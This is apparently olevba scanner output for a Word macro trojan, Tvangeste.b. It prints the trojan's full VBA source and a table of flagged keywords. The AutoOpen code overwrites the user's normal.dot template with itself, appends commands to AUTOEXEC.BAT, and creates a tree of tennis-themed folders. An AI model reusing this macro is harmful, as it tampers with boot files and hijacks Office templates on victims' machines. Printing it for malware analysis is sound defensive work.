olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Trojan.MSWord.Tvangeste.b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Trojan.MSWord.Tvangeste.b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO NewMacros.bas 
in file: Trojan.MSWord.Tvangeste.b - OLE stream: 'Macros/VBA/NewMacros'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
    ActiveDocument.SaveAs FileName:= _
        "C:\Program Files\Microsoft Office\Шаблоны\kafeln.dot", FileFormat:= _
        wdFormatTemplate, LockComments:=False, Password:="", AddToRecentFiles:= _
        True, WritePassword:="", ReadOnlyRecommended:=False, EmbedTrueTypeFonts:= _
        False, SaveNativePictureFormat:=False, SaveFormsData:=False, _
        SaveAsAOCELetter:=False
    ChangeFileOpenDirectory "C:\"
    Documents.Open FileName:="AUTOEXEC.BAT", ConfirmConversions:=False, _
        ReadOnly:=False, AddToRecentFiles:=False, PasswordDocument:="", _
        PasswordTemplate:="", Revert:=False, WritePasswordDocument:="", _
        WritePasswordTemplate:="", Format:=wdOpenFormatAuto
    Selection.EndKey Unit:=wdStory
    Selection.TypeParagraph
    Selection.TypeText Text:="cd C:\Program Files\Microsoft Office\Шаблоны\"
    Selection.TypeParagraph
    Selection.TypeText Text:="del normal.dot"
    Selection.TypeParagraph
    Selection.TypeText Text:="ren kafeln.dot normal.dot"
    ActiveDocument.Save
    ActiveDocument.Close
    Application.Run MacroName:="ATPtour"
End Sub
Sub ATPtour()
    ChangeFileOpenDirectory "C:\"
    Documents.Open FileName:="AUTOEXEC.BAT", ConfirmConversions:=False, _
        ReadOnly:=False, AddToRecentFiles:=False, PasswordDocument:="", _
        PasswordTemplate:="", Revert:=False, WritePasswordDocument:="", _
        WritePasswordTemplate:="", Format:=wdOpenFormatAuto
    Selection.EndKey Unit:=wdStory
    Selection.TypeParagraph
    Selection.TypeText Text:="md c:\atp_tour"
    Selection.TypeParagraph
    Selection.TypeText Text:="md c:\atp_tour\kafelnik.001"
    Selection.TypeParagraph
    Selection.TypeText Text:="md c:\atp_tour\sampras.002"
    Selection.TypeParagraph
    Selection.TypeText Text:="md c:\atp_tour\corretja.003"
    Selection.TypeParagraph
    Selection.TypeText Text:="md c:\atp_tour\rafter.004"
    Selection.TypeParagraph
    Selection.TypeText Text:="md c:\atp_tour\moya.006"
    Selection.TypeParagraph
    Selection.TypeText Text:="md c:\atp_tour\henman.007"
    Selection.TypeParagraph
    Selection.TypeText Text:="md c:\atp_tour\rios.008"
    Selection.TypeParagraph
    Selection.TypeText Text:="md c:\atp_tour\philipou.009"
    Selection.TypeParagraph
    Selection.TypeText Text:="md c:\atp_tour\kucera.010"
    Selection.TypeParagraph
    Selection.TypeText Text:="md c:\atp_tour\krajicek.005"
    Selection.TypeParagraph
    Selection.TypeText Text:="subst k: c:\atp_tour >nul"
    Selection.TypeParagraph
    ActiveDocument.Save
    ActiveDocument.Close
    Application.Run MacroName:="ATP"
End Sub
Sub ATP()
Dim Msg, Style, Title, Help, Ctxt, Response, MyString
Msg = "3 мая 1999 года Кафельников - номер 1!!!!!!!!"
Style = vbYesOk + vbCritical + vbDefaultButton2
Title = "ATPtour"
Help = "DEMO.HLP"
Ctxt = 1000
Response = MsgBox(Msg, Style, Title, Help, Ctxt)
If Response = vbYes Then
    MyString = "Да"
Else
    MyString = "Нет"
End If
    Application.Run MacroName:="tour"
End Sub
Sub tour()
Dim Msg, Style, Title, Help, Ctxt, Response, MyString
Msg = "3 мая 1999 года Кафельников - номер 1!!!!!!!!"
Style = vbYesOk + vbCritical + vbDefaultButton2
Title = "ATPtour"
Help = "DEMO.HLP"
Ctxt = 1000
Response = MsgBox(Msg, Style, Title, Help, Ctxt)
If Response = vbYes Then
    MyString = "Да"
Else
    MyString = "Нет"
End If
    Application.Run MacroName:="Info"
End Sub
Sub Info()
Attribute Info.VB_Description = "Макрос записан 07.04.98 Tvangeste"
Attribute Info.VB_ProcData.VB_Invoke_Func = "Project.NewMacros.Info"
Dim Msg, Style, Title, Help, Ctxt, Response, MyString
Msg = "Kafelnikov"
Style = vbYesOk + vbCritical + vbDefaultButton2
Title = "Tvangeste v 2.0"
Help = "DEMO.HLP"
Ctxt = 1000
Response = MsgBox(Msg, Style, Title, Help, Ctxt)
If Response = vbYes Then
    MyString = "Да"
Else
    MyString = "Нет"
End If
    ActiveDocument.Save
    ActiveDocument.Close
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AUTOEXEC            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |AUTOEXEC.BAT        |Executable file name                         |
+----------+--------------------+---------------------------------------------+

